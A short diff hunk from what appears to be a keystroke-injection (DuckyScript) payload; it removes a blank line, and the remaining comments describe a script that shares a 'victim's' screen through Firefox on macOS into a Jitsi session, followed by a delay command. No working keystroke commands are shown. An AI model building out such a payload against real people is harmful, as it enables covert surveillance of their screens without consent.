@@ -1,4 +1,3 @@
-
 REM Script to share a victim's screen via Firefox on MacOS by Skicka 2022.
 REM You must set up a Jitsi session first & paste the URL over the example
 DELAY 3000
